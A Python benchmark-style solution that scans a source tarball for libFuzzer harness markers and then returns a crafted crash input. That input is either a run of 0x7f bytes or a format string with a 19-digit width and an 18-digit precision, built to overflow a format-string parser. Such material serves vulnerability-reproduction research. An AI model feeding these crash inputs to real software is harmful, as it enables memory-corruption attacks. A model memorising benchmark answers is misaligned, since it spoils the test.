import tarfile
from typing import Optional


class Solution:
    def _infer_input_mode(self, src_path: str) -> str:
        # Heuristic: if a fuzz harness consumes integrals from raw bytes, prefer "binary".
        # Otherwise, default to "text".
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".inl", ".m", ".mm")
        max_files = 250
        max_file_size = 2_000_000
        max_total_read = 25_000_000

        total_read = 0
        files_read = 0

        saw_fuzzer_entry = False
        saw_fdp = False
        saw_integral = False
        saw_string_consume = False
        saw_str_from_data = False

        def scan_blob(b: bytes) -> None:
            nonlocal saw_fuzzer_entry, saw_fdp, saw_integral, saw_string_consume, saw_str_from_data
            if b"LLVMFuzzerTestOneInput" in b:
                saw_fuzzer_entry = True
            if b"FuzzedDataProvider" in b:
                saw_fdp = True
            if b"ConsumeIntegral" in b or b"consume_integral" in b or b"ConsumeIntegralInRange" in b:
                saw_integral = True
            if (
                b"ConsumeRemainingBytesAsString" in b
                or b"ConsumeRandomLengthString" in b
                or b"ConsumeBytesAsString" in b
                or b"ConsumeBytes" in b and b"std::string" in b
            ):
                saw_string_consume = True
            if b"std::string(" in b and (b"data" in b or b"Data" in b) and (b"size" in b or b"Size" in b):
                saw_str_from_data = True

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf:
                    if not m.isfile():
                        continue
                    name = (m.name or "").lower()
                    if not name.endswith(exts):
                        continue
                    if m.size <= 0 or m.size > max_file_size:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    b = f.read()
                    if not b:
                        continue
                    total_read += len(b)
                    files_read += 1
                    scan_blob(b)
                    if files_read >= max_files or total_read >= max_total_read:
                        break
        except Exception:
            return "text"

        if saw_fuzzer_entry and (saw_fdp or saw_integral):
            if saw_integral and not (saw_string_consume or saw_str_from_data):
                return "binary"
            return "text"

        return "text"

    def solve(self, src_path: str) -> bytes:
        mode = self._infer_input_mode(src_path)
        if mode == "binary":
            # Two large positive 64-bit values without NUL bytes (0x7f repeating) to inflate width/precision.
            return (b"\x7f" * 16) + b"\x7f"
        # 40 bytes: '%' + 19-digit width + '.' + 18-digit precision + 'd'
        return b"%9223372036854775807.922337203685477580d"